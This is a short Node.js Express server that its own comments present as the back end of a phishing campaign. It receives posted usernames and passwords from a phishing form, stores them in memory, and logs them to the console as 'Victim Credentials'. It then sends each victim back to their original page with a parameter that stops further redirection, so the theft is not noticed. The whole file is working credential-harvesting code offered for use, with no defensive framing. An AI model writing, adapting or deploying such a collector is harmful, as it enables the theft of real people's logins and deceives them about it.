var express = require('express');
var bodyParser = require('body-parser');
var app = express();

var userMap = {};
var nextUserId = 0;

// - The disableParam plays a very important role. 
//
//This allows the user to return to their browsing
//without being redirected back to our phishing form.
//
//If we kept redirecting traffic here, we would raise suspicion
//by attacking the availability of the resource.
// 
const disableParam = '?x=1';

app.use(bodyParser.urlencoded({
    extended: true
}));

app.get('/', function(req, res) {
    //If the user makes a GET request
    //send a 403.
    res.sendStatus(403);
});

app.post('/', function(req, res) {
    //If the user makes a POST request.

    //store the parameter information in our map
    userMap[nextUserId++] = {
        'userId' : nextUserId,
        'redirect' : req.body.redirect,
        'username' : req.body.username,
        'password' : req.body.password,
    };
    
    //log it to the console
    console.log('Received Victim Credentials:['+req.body.redirect+']\tUsername:['+req.body.username+']\tPassword:['+req.body.password+']');
    
    //and redirect them back to where they were.
    res.redirect(req.body.redirect + disableParam);
});


console.log('Started on port 9999');
app.listen(9999);